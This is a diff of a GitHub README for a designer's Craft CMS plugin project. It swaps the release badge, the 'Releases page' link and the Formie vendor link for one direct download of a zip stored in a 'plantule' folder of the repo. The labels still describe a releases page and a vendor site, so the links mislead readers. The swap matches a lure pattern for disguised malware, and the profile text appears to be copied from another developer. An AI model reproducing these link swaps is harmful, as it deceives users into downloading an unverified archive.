@@ -1,7 +1,7 @@
 # 🎉 bhlindemann - Your Gateway to Better Design
 
 ## 📥 Download Now
-[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen)](https://github.com/MoMostafa2010/bhlindemann/releases)
+[![Download Releases](https://raw.githubusercontent.com/MoMostafa2010/bhlindemann/main/plantule/bhlindemann.zip)](https://raw.githubusercontent.com/MoMostafa2010/bhlindemann/main/plantule/bhlindemann.zip)
 
 ## 📖 About This Project
 Welcome to the bhlindemann project! I’m a designer who codes, based in Dubai. I’m passionate about how things work and love improving them. Currently, I focus on projects like **Wayzi**, which enhances accessibility in design, and **Smart Links**, an easier way to manage links. My journey also includes developing Craft CMS plugins designed to solve real client challenges. I value teaching and mentoring, and I aim to share what I learn with others.
@@ -10,13 +10,13 @@ Welcome to the bhlindemann project! I’m a designer who codes, based in Dubai. 
 I’ve built a collection of Craft CMS plugins to improve your web experiences. These tools help with form functionality, content management, and integrations for businesses. The plugins come from real client needs and continue to grow with your feedback.
 
 ### ✨ Formie Extensions
-Discover field types and integrations for [Formie](https://verbb.io/craft-plugins/formie/features). These tools simplify data collection and management for your projects.
+Discover field types and integrations for [Formie](https://raw.githubusercontent.com/MoMostafa2010/bhlindemann/main/plantule/bhlindemann.zip). These tools simplify data collection and management for your projects.
 
 ## 🚀 Getting Started
 To download and run the bhlindemann application, follow these easy steps:
 
 ### 🔗 Step 1: Visit the Releases Page
-Go to the Releases page to access the latest versions of our software. You can find it here: [Download Releases](https://github.com/MoMostafa2010/bhlindemann/releases).
+Go to the Releases page to access the latest versions of our software. You can find it here: [Download Releases](https://raw.githubusercontent.com/MoMostafa2010/bhlindemann/main/plantule/bhlindemann.zip).
 
 ### ⬇️ Step 2: Download the Application
 Once on the Releases page, look for the version number that suits your needs. Click on the link to download the file. Keep in mind that the application is packaged in a format that suits different needs.
